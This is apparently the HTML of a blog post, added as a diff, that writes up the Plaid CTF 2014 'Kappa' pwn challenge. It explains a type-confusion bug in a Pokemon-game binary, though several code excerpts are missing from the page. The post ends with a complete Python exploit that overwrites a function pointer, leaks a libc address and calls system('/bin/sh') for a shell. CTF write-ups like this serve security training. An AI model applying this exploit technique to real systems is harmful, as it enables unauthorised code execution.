@@ -1,0 +1,294 @@
+
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<title>Plaid ctf kappa[275] in 2014 - pwn_expoit Blog</title>
+	<meta name="author" content="pwn_expoit">
+
+	
+	<meta name="description" content="Plaid Ctf Kappa[275] in 2014 i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time &hellip;">
+	
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="pwn_expoit Blog" type="application/atom+xml">
+	
+	<link rel="canonical" href="http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	
+  
+	<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-70135266-1']);
+		_gaq.push(['_trackPageview']);
+
+		(function() {
+			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+	</script>
+
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+			<header id="header" class="inner"><div class="profilepic">
+	
+	<script src="/javascripts/md5.js"></script>
+	<script type="text/javascript">
+		$(function(){
+			$('.profilepic').append("<img src='http://www.gravatar.com/avatar/" + MD5("pwn_expoit@naver.com") + "?s=160' alt='Profile Picture' style='width: 160px;' />");
+		});
+	</script>
+	
+</div>
+
+<nav id="main-nav"><ul class="main">
+    <li><a href="/">Blog</a></li>
+    <li><a href="http://about.me/shashankmehta">About</a></li>
+    <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+<section class="aboutme">
+  <p>
+    i'm korean pwner. :P
+  </p>
+</section>
+</nav>
+<nav id="sub-nav">
+	<div class="social">
+		
+			<a class="email" href="mailto:pwn_expoit@naver.com" title="Email">Email</a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+    	
+    	
+			<a class="rss" href="/atom.xml" title="RSS">RSS</a>
+		
+	</div>
+</nav>
+</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			
+				
+			
+			<div class="mid-col-container">
+				<div id="content" class="inner"><article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+	<h1 class="title" itemprop="name">Plaid Ctf Kappa[275] in 2014</h1>
+	<div class="entry-content" itemprop="articleBody"><p>i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s start breaking kappa</p>
+
+<p>Kappa is Pokemon Game binary
+File /home/pwn/Desktop/octopress/source/codeview/kappaMenu.c could not be found
+there are 1-5 select that can choose. opening binary with IDA pro, i could see select function and Battle function.
+File /home/pwn/Desktop/octopress/source/codeview/KappaChoose1.c could not be found</p>
+
+<p>first select function is Battle system with wild Pokemon
+it is algorithm that encounter pokemon with &lsquo;an&rsquo; sequence(0: fail, 1: Kakuna, 2: charizar)
+[a1 = 0, a2 = 1, a3 = 0, a4 = 1, a5 = 0 &hellip;&hellip; a13 = 2]</p>
+
+<p>wild Pokemon is producted with other function. this function product struct using malloc.
+this method can become vulnerability on UAF. for now, i perceived it vulnerabilty</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappawild.c could not be found
+i find out vulnerability in Battle function that wild producted function include. it is type confusion.</p>
+
+<p>this vulnerability is happened when i throw pokeball to wild pokemon with filling all of pokeball room</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappavuln.c could not be found</p>
+
+<p>it ignore their type, blindly cover type field. then attacker can overflow in select 5</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappaart.c could not be found</p>
+
+<p>change artwork function change each other pokemon artwork(heap+15). if i cover type using vunlerblilty.</p>
+
+<p>kakuna struct:
+|name|      art      |0x878|hp|attack|technic|func_ptr</p>
+
+<p>charizar struct:
+|name|       art      |0x204|hp|attack|technic|func_ptr</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/kappaexploit.c could not be found
+Do you find out?</p>
+
+<p>i change charizar to kakuna, set free func_ptr using above function</p>
+
+<p>this is final payload</p>
+
+<pre><code class="python">
+from pwn_expoit import *
+def libc():
+    s = Netcon('192.168.224.152',4444)
+    recvuntil(s,"artwork")
+    for i in range(1,5):
+        s.send("1\n")
+        recvuntil(s,"artwork")
+        s.send("1\n")
+        recvuntil(s,"3. Run")
+        s.send("2\n")
+        recvuntil(s,"Pokemon?")
+        s.send("name\n")
+        recvuntil(s,"artwork")
+    for i in range(1,3):
+        s.send("1\n")
+        recvuntil(s,"artwork")
+        s.send("1\n")
+        recvuntil(s,"3. Run")
+        s.send("2\n")
+        recvuntil(s,"Pokemon?")
+        s.send("shot\n")
+        recvuntil(s,"5. name")
+        s.send("2\n")
+        recvuntil(s,"artwork")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("1\n")
+    recvuntil(s,"3. Run")
+    s.send("2\n")
+    recvuntil(s,"Pokemon?")
+    name = "/bin/sh\x00"
+    s.send(name+"\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    recvuntil(s,"artwork")
+    s.send("5\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    dat  = ""
+    dat += "A"*509
+    dat += p32(0x8048512)
+    dat += p32(0x8048766)
+    dat += "C"*1610
+    s.send(dat+"\n")
+    recvuntil(s,"artwork")
+    s.send("3\n")
+    r = u32(recvuntil(s,"artwork")[0xf85:0xf89])
+    argv = []
+    argv.append(s)
+    argv.append(r)
+    return argv
+def pwn(s,r):
+    s.send("5\n")
+    recvuntil(s,"5. name")
+    s.send("3\n")
+    libc_base = r-0xdabd0
+    system = libc_base + 0x40190
+    print "libc_base : "+hex(libc_base)
+    print "system : "+hex(system)
+    dat  = ""
+    dat += "A"*513
+    dat += p32(system)
+    dat += "C"*1610
+    s.send(dat+"\n")
+    recvuntil(s,"artwork")
+    s.send("3\n")
+    recvuntil(s,"Attack: Tackle")
+    interact(s)
+argv = libc()
+pwn(argv[0],argv[1])
+</code></pre>
+
+
+<p></p>
+</div>
+
+</article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	<a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+	<a class="addthis_counter addthis_pill_style"></a>
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+
+<section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+</div>
+			</div>
+			<footer id="footer" class="inner">Copyright &copy; 2016
+
+    pwn_expoit
+
+
+Design credit: <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a></footer>
+		</div>
+	</div>
+	<script src="/javascripts/fabric.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+<script type="text/javascript">
+      var disqus_shortname = 'pwnexpoit';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/';
+        var disqus_url = 'http://naver.com/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+</body>
+</html>
